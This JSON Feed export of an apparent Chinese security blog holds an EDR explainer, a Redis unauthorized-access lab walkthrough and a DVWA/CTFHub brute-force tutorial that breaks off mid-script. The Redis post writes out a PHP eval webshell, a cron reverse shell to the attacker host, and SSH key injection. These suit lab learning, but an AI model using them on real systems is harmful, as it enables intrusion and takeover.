{
    "version": "https://jsonfeed.org/version/1",
    "title": "少即是多，慢即是快",
    "subtitle": "",
    "icon": "https://ph0ven1x.github.io/assets/favicon.ico",
    "description": "热爱技术，热爱生活",
    "home_page_url": "https://ph0ven1x.github.io",
    "items": [
        {
            "id": "https://ph0ven1x.github.io/2024/08/26/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87EDR/",
            "url": "https://ph0ven1x.github.io/2024/08/26/%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87EDR/",
            "title": "安全设备EDR",
            "date_published": "2024-08-26T13:39:12.000Z",
            "content_html": "<h1 id=\"安全设备edr\"><a class=\"anchor\" href=\"#安全设备edr\">#</a> 安全设备 EDR</h1>\n<h2 id=\"什么是edr\"><a class=\"anchor\" href=\"#什么是edr\">#</a> 什么是 EDR</h2>\n<p>EDR，全称 Endpoint Detection and Response，是一种用于检测、预防、响应和预测计算机或网络中发生的安全威胁的技术和方法。它通过在端点上收集各种日志和事件数据，实施监控和分析这些数据，以发现异常行为或潜在的安全威胁，并采取相应的措施进行响应。与 SIEM 相比，EDR 更注重端点安全，强调端点检测与响应。</p>\n<h2 id=\"四大功能\"><a class=\"anchor\" href=\"#四大功能\">#</a> 四大功能</h2>\n<p>实时监控：EDR 系统实时监控端点设备的活动，包括文件访问、进程执行、网络连接等，以便识别异常行为。</p>\n<p>威胁检测：它使用行为分析、签名匹配、机器学习等技术来检测潜在的威胁和攻击模式。</p>\n<p>威胁响应：EDR 能够快速响应检测到的威胁，采取措施如隔离感染设备、阻止攻击传播、修复漏洞等。</p>\n<p>调查和分析：它提供详细的事件日志和威胁情报，有助于安全团队进行调查和分析，了解攻击的来源和影响。</p>\n<h2 id=\"工作原理\"><a class=\"anchor\" href=\"#工作原理\">#</a> 工作原理</h2>\n<p><img loading=\"lazy\" data-src=\"EDR%E5%8E%9F%E7%90%86%E5%9B%BE.png\" alt=\"EDR原理图\" /></p>\n<ol>\n<li>各个服务器终端安装 Agent；</li>\n<li>通过 Agent 将 “行为数据：进程、网络访问、文件特征...”、静态样本、系统、软件特征、硬件特征等信息上传分析平台（服务端）</li>\n<li>服务端通过威胁情报、沙箱、AI 模型等进行分析；</li>\n<li>通过服务端的分析后对那些危险的样本进行隔离、危险进程进行阻断等；</li>\n</ol>\n<h2 id=\"edr和传统杀毒的区别\"><a class=\"anchor\" href=\"#edr和传统杀毒的区别\">#</a> EDR 和传统杀毒的区别</h2>\n<p>对于端点安全，传统杀毒软件是怎么做的？</p>\n<ul>\n<li>传统杀毒软件是基于签名的，所以它只识别已知的威胁</li>\n<li>传统杀毒软件可以定期扫描受保护设备，以检测已知的威胁协助清除更基本的病毒（蠕虫、木马、恶意软件、广告软件、间谍软件等）</li>\n<li>基于数据库来提供关于可能恶意网站的警告</li>\n</ul>\n<p>对于端点安全，EDR 是怎么做的？</p>\n<ul>\n<li>EDR 包括对威胁的实时监控和检测，包括那些可能不容易被标准反病毒识别或定义的威胁。此外，EDR 是基于行为的，因此它可以基于不正常的行为检测未知的威胁。</li>\n<li>基于大数据和人工智能的数据收集和分析系统，以此确定威胁模式，并向用户发出威胁警报附带取证功能可以帮助确定在安全事件中发生了什么攻击行为。</li>\n<li>EDR 可以包括对某些威胁的自动修复或移除，例如主机的微隔离，通过控制主机的进出站流量，实现对异常主机的隔离。</li>\n</ul>\n<p>总的来说，杀毒软件只能对已知的病毒进行查杀，且不能知晓攻击路径或漏洞点；EDR 根据行为则可以应对 0day 攻击，且能分析出攻击路径。</p>\n<h2 id=\"edr的一些误区\"><a class=\"anchor\" href=\"#edr的一些误区\">#</a> EDR 的一些误区</h2>\n<ul>\n<li>EDR 最大的误区是 “一劳永逸”\n<ul>\n<li>EDR 产品比传统防病毒软件更昂贵</li>\n<li>EDR 需要足够经验丰富的操作人员来使用</li>\n<li>一些 EDR 的可扩展性有限，不能随公司发展改善其安全状况</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "应急响应",
                "应急响应",
                "安全设备"
            ]
        },
        {
            "id": "https://ph0ven1x.github.io/2024/08/16/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/",
            "url": "https://ph0ven1x.github.io/2024/08/16/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/",
            "title": "Redis未授权访问漏洞",
            "date_published": "2024-08-15T17:23:11.000Z",
            "content_html": "<h1 id=\"redis未授权访问漏洞\"><a class=\"anchor\" href=\"#redis未授权访问漏洞\">#</a> Redis 未授权访问漏洞</h1>\n<p>Redis 3.2.0 之前的版本，默认没有安全保护和密码，Redis 3.2.0 以后包括 3.2.0 需要关闭安全保护和开启远程访问。</p>\n<p>高版本 Redis 开启远程连接</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">vim</span> /etc/redis/redis.conf</pre></td></tr></table></figure><ul>\n<li>将 <code>bind 127.0.0.1 ::1</code>  注释掉</li>\n<li><code>protected-mode yes</code>  改为 <code>protected-mode no</code></li>\n<li><code># requirepass foobared</code>  去掉注释，在后面加上要改的密码，这里不用设置密码\n<ul>\n<li>例如： <code>requirepass foobared 123456</code></li>\n</ul>\n</li>\n</ul>\n<p>redis 内存配置</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">vim</span> /etc/sysctl.conf</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 新增下方配置</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>vm.overcommit_memory <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># 最后重启系统</span></pre></td></tr></table></figure><h2 id=\"redis环境搭建\"><a class=\"anchor\" href=\"#redis环境搭建\">#</a> Redis 环境搭建</h2>\n<p>靶机环境：Ubuntu 20.04.6</p>\n<p>IP 地址：192.168.23.129</p>\n<p>安装 redis3.0.7、gcc、make</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">wget</span> https://download.redis.io/releases/redis-3.0.7.tar.gz</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">tar</span> <span class=\"token parameter variable\">-zvxf</span> redis-3.0.7.tar.gz</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">cd</span> redis-3.0.7</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> gcc <span class=\"token function\">make</span> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">make</span> </pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token builtin class-name\">cd</span> src</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token function\">sudo</span> ./redis-server <span class=\"token comment\">#这里要加 sudo，以 root 启动，不然攻击时 shell 文件写不进去的，权限不够</span></pre></td></tr></table></figure><h2 id=\"php74apache2搭建\"><a class=\"anchor\" href=\"#php74apache2搭建\">#</a> php7.4+apache2 搭建</h2>\n<ol>\n<li>安装 apache2</li>\n</ol>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 安装 apache2</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> apache2</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># 查看 apache 运行状态</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> systemctl status apache2</pre></td></tr></table></figure><p>查看<a href=\"http://192.168.23.129\"> http://192.168.23.129</a>，显示 it works 代表成功</p>\n<p><img loading=\"lazy\" data-src=\"image-20240814231011239.png\" alt=\"image-20240814231011239\" /></p>\n<ol start=\"2\">\n<li>安装 php7.4</li>\n</ol>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> libapache2-mod-php7.4 php7.4</pre></td></tr></table></figure><ol start=\"3\">\n<li>在 <code>/var/www/html/</code>  目录下新建一个 info.php, 检查 php 安装是否成功</li>\n</ol>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /var/www/html/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">touch</span> info.php</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> info.php</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># info.php 内容:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">&lt;</span>?php phpinfo<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> ?<span class=\"token operator\">></span></pre></td></tr></table></figure><p>访问<a href=\"http://192.168.23.129/info.php\"> http://192.168.23.129/info.php</a>  显示如下代表成功</p>\n<p><img loading=\"lazy\" data-src=\"image-20240814230947791.png\" alt=\"image-20240814230947791\" /></p>\n<h2 id=\"redis写入webshell\"><a class=\"anchor\" href=\"#redis写入webshell\">#</a> Redis 写入 Webshell</h2>\n<p>攻击机环境：Kali Linux 2024.1</p>\n<p>IP 地址：192.168.23.132</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>redis-cli <span class=\"token parameter variable\">-h</span> <span class=\"token number\">192.168</span>.23.129</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>config <span class=\"token builtin class-name\">set</span> <span class=\"token function\">dir</span> /var/www/html</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>config <span class=\"token builtin class-name\">set</span> dbfilename shell.php</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> x <span class=\"token string\">'\\n\\n&lt;?php highlight_file(__FILE__); eval($_REQUEST[1]); ?>\\n\\n'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>save</pre></td></tr></table></figure><p>使用蚁剑连接即可：</p>\n<p><img loading=\"lazy\" data-src=\"image-20240815220655353.png\" alt=\"image-20240815220655353\" /></p>\n<h2 id=\"redis写入计划任务反弹shell\"><a class=\"anchor\" href=\"#redis写入计划任务反弹shell\">#</a> Redis 写入计划任务反弹 shell</h2>\n<p>正常创建计划任务：</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 靶机</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># 查看计划任务</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">crontab</span> <span class=\"token parameter variable\">-l</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>显示：no <span class=\"token function\">crontab</span> <span class=\"token keyword\">for</span> ubuntu 代表没有计划任务</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 创建计划任务</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">crontab</span> <span class=\"token parameter variable\">-e</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 分 时 日 月 星期 反弹 shell 命令</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>* * * * * <span class=\"token function\">bash</span> <span class=\"token parameter variable\">-i</span> <span class=\"token operator\">>&amp;</span> /dev/tcp/192.168.23.132/30001 <span class=\"token operator\"><span class=\"token file-descriptor important\">0</span>></span><span class=\"token file-descriptor important\">&amp;1</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># ubuntu 计划任务目录：/var/spool/cron/crontabs</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># root 文件是以 root 权限创建的任务，以用户名命名的文件是以用户权限创建的任务</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 攻击机</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># 使用 nc 监听 30001 端口</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">nc</span> lvvp <span class=\"token number\">30001</span></pre></td></tr></table></figure><p><strong>这里有两个坑</strong>：</p>\n<ol>\n<li>Ubuntu 的计划任务不能容错，语法会进行严格检查，所以 Redis 写入的乱码会导致计划任务无法正常运行</li>\n<li>Ubuntu 下默认时 <code>/bin/dash</code>  执行脚本，即使删掉乱码计划任务仍无法执行，我们可以用命令 <code>ls -l /bin/sh</code>  来查看，使用 <code>ln -fs /bin/bash /bin/sh</code>  改变为 bash 执行</li>\n</ol>\n<p>由于 Ubuntu 的计划任务不能容错，语法会进行严格检查，所以写计划任务用到了 Docker 搭建 CentOS 环境来测试:</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># 先关闭 redis</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /home/ubuntu/redis-3.0.7/src</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>./redis-cli</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">shutdown</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">exit</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 拉取镜像</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token function\">docker</span> pull sqlsec/redis5-centos7-cron:latest</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 创建容器</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">docker</span> run <span class=\"token parameter variable\">-d</span> <span class=\"token parameter variable\">-p</span> <span class=\"token number\">6379</span>:6379 sqlsec/redis5-centos7-cron:latest</pre></td></tr></table></figure><p>使用 Redis 写入计划任务</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>config <span class=\"token builtin class-name\">set</span> <span class=\"token function\">dir</span> /var/spool/cron/</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>config <span class=\"token builtin class-name\">set</span> dbfilename root</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token builtin class-name\">set</span> x <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token entity\" title=\"\\n\">\\n</span>* * * * * bash -i >&amp; /dev/tcp/192.168.23.132/30001 0>&amp;1<span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>save</pre></td></tr></table></figure><p>攻击机开启 30001 监听</p>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">nc</span> <span class=\"token parameter variable\">-lvp</span> <span class=\"token number\">30001</span></pre></td></tr></table></figure><p>成功反弹 shell</p>\n<p><img loading=\"lazy\" data-src=\"image-20240815234929777.png\" alt=\"image-20240815234929777\" /></p>\n<h2 id=\"redis写入公私钥ssh登录\"><a class=\"anchor\" href=\"#redis写入公私钥ssh登录\">#</a> Redis 写入公私钥 ssh 登录</h2>\n<p>redis 版本为 3.0.7，靶机：ubuntu20.04.6，ip 地址：192.168.23.129</p>\n<p>注意：redis 要以 root 权限启动</p>\n<ol>\n<li>搭建 ssh 环境</li>\n</ol>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> openssh-server</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># ssh 配置文件目录 /etc/ssh/sshd_config</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># PermitRootLogin yes/no 可以开启远程密码登录，yes 为开启，no 为禁止</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">sudo</span> ssh-keygen</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /root/.ssh/</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">ls</span> <span class=\"token parameter variable\">-a</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># 可以看到 id_rsa 和 id_rsa.pub</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 启动 redis</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token builtin class-name\">cd</span> /home/ubuntu/redis-3.0.7/src</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token function\">sudo</span> ./redis-server  <span class=\"token comment\"># 以 root 权限启动</span></pre></td></tr></table></figure><ol start=\"2\">\n<li>攻击机生成一对公私钥</li>\n</ol>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ssh-keygen</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">ls</span> /root/.ssh/</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>会生成这两个文件id_ed25519  id_ed25519.pub</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">cat</span> id_ed25519.pub</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWMotBGQ2Vh/pp/yhw5yOkOAZ7iS2/cpxajmCRoGOQ5 root@kali</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>复制出公钥</pre></td></tr></table></figure><ol start=\"3\">\n<li>redis 写公钥</li>\n</ol>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>redis-cli <span class=\"token parameter variable\">-h</span> <span class=\"token number\">192.168</span>.23.129</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>config <span class=\"token builtin class-name\">set</span> <span class=\"token function\">dir</span> /root/.ssh/</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>config <span class=\"token builtin class-name\">set</span> dbfilename authorized_keys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token builtin class-name\">set</span> x <span class=\"token string\">\"<span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token entity\" title=\"\\n\">\\n</span>ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMWMotBGQ2Vh/pp/yhw5yOkOAZ7iS2/cpxajmCRoGOQ5 root@kali<span class=\"token entity\" title=\"\\n\">\\n</span><span class=\"token entity\" title=\"\\n\">\\n</span>\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># 公钥粘贴到这，前后加两个 \\n\\n</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>save</pre></td></tr></table></figure><ol start=\"4\">\n<li>登录 ssh</li>\n</ol>\n<figure class=\"highlight shell\"><figcaption data-lang=\"Bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> <span class=\"token parameter variable\">-i</span> /root/.ssh/id_ed25519 root@192.168.23.129</pre></td></tr></table></figure><p><img loading=\"lazy\" data-src=\"image-20240816011049327.png\" alt=\"image-20240816011049327\" /></p>\n",
            "tags": [
                "Web安全",
                "Web安全",
                "Redis未授权访问漏洞"
            ]
        },
        {
            "id": "https://ph0ven1x.github.io/2024/07/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/",
            "url": "https://ph0ven1x.github.io/2024/07/09/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/",
            "title": "暴力破解",
            "date_published": "2024-07-09T15:57:11.000Z",
            "content_html": "<h1 id=\"爆破破解\"><a class=\"anchor\" href=\"#爆破破解\">#</a> 爆破破解</h1>\n<h2 id=\"web认证爆破\"><a class=\"anchor\" href=\"#web认证爆破\">#</a> Web 认证爆破</h2>\n<h3 id=\"基础爆破\"><a class=\"anchor\" href=\"#基础爆破\">#</a> 基础爆破</h3>\n<p><strong>DVWA 爆破模块难度：low、medium</strong></p>\n<p>难度 low：没有任何防爆破措施，没有对用户名和密码的输入进行过滤，使用 GET 登录安全性低。</p>\n<p>难度 meidium：防爆方面只做了延时，增加了爆破时间但依旧能爆破，对用户名和密码的输入进行了过滤，使用 GET 登录安全性低。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710173011134.png\" alt=\"image-20240710173011134\" /></p>\n<p><img loading=\"lazy\" data-src=\"image-20240710173152804.png\" alt=\"image-20240710173152804\" /></p>\n<h3 id=\"basic认证爆破\"><a class=\"anchor\" href=\"#basic认证爆破\">#</a> Basic 认证爆破</h3>\n<p>靶场地址：<a href=\"https://www.ctfhub.com/#/skilltree\">https://www.ctfhub.com/#/skilltree</a></p>\n<p>靶场位置：<strong>技能树 --&gt;Web--&gt;Web 前置技能 --&gt;HTTP 协议 ---&gt; 基础认证</strong></p>\n<p><img loading=\"lazy\" data-src=\"image-20240710173812961.png\" alt=\"image-20240710173812961\" /></p>\n<p>Basic 认证的特征: <code> Authorization：Basic 用户名:密码(base64加密)</code> 。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710173932677.png\" alt=\"image-20240710173932677\" /></p>\n<p><img loading=\"lazy\" data-src=\"image-20240710174013818.png\" alt=\"image-20240710174013818\" /></p>\n<p><img loading=\"lazy\" data-src=\"image-20240710174042171.png\" alt=\"image-20240710174042171\" /></p>\n<p>发送到 Intruder，攻击模式：Sniper，负载位置选择 <code>用户名:密码 </code> 。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710174150101.png\" alt=\"image-20240710174150101\" /></p>\n<p>payload 类型选择 Custom Iterator （自定义迭代器）迭代器位置 1 设置成用户名 admin，用 <code>:</code>  分割，同时 payload 配置为 Base64 加密。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710175518863.png\" alt=\"image-20240710175518863\" /></p>\n<p>位置 2 导入密码即可，开始攻击，注意把 payload encoding 关掉。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710175604210.png\" alt=\"image-20240710175604210\" /></p>\n<p>长度最短的就是正确的用户名和密码，得到 flag。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710175647008.png\" alt=\"image-20240710175647008\" /></p>\n<p>右键进行 Base64 解密，可以看到真实的用户名和密码。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710175715868.png\" alt=\"image-20240710175715868\" /></p>\n<h3 id=\"带token爆破\"><a class=\"anchor\" href=\"#带token爆破\">#</a> 带 token 爆破</h3>\n<p><strong>DVWA 暴力破解模块 - high</strong></p>\n<p>先说第一种方案，使用 BurpSuite 来爆破。</p>\n<p>抓包发送到 intruder 模块，攻击类型选择 Pitchfork，将密码和 token 配置为 payload positions。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710210907703.png\" alt=\"image-20240710210907703\" /></p>\n<p>然后在 setting 中找到 Grep -Extract 功能，抓取响应包，双击 token 值点击 ok，就能自动在爆破中抓取 token 值</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710211302711.png\" alt=\"image-20240710211302711\" /></p>\n<p>在 settings 中找到 Redirections，选择 Always，总是跟随重定向。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710211411672.png\" alt=\"image-20240710211411672\" /></p>\n<p>在 Resource pool 中配置线程，这里只能使用单线程，因为 token 要一次一次从响应包中抓取，这次抓取的 token，用于下次尝试登录。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710211503741.png\" alt=\"image-20240710211503741\" /></p>\n<p>第一个 payload 导入密码字典，密码字典设两个空密码用于防止爆破时遗漏第一个密码，后面爆破时就能看到效果。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710211052235.png\" alt=\"image-20240710211052235\" /></p>\n<p>第二个 payload 是 token，用的是抓取的 token 值，payload type 选择 Recursive grep。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710211601607.png\" alt=\"image-20240710211601607\" /></p>\n<p>这里就能看到之前留空密码的作用。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710211826175.png\" alt=\"image-20240710211826175\" /></p>\n<p>Length 最长的就是真实密码。</p>\n<p><img loading=\"lazy\" data-src=\"image-20240710211909128.png\" alt=\"image-20240710211909128\" /></p>\n<p>第二种方案，编写 python 脚本来爆破</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> re</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">get_token</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> headers_index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    html <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> headers<span class=\"token operator\">=</span>headers_index<span class=\"token punctuation\">,</span> timeout<span class=\"token operator\">=</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    pattern <span class=\"token operator\">=</span> <span class=\"token string\">r\"&lt;input type='hidden' name='user_token' value='(.*?)' />\"</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">match</span> <span class=\"token operator\">=</span> re<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>pattern<span class=\"token punctuation\">,</span> html<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token keyword\">match</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        user_token <span class=\"token operator\">=</span> <span class=\"token keyword\">match</span><span class=\"token punctuation\">.</span>group<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">return</span> user_token</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'未找到user_token'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">brute</span><span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> headers_index<span class=\"token punctuation\">,</span> username<span class=\"token punctuation\">,</span> password_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> get_token<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> headers_index<span class=\"token punctuation\">)</span> <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">return</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>password_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            lines <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">.</span>readlines<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td 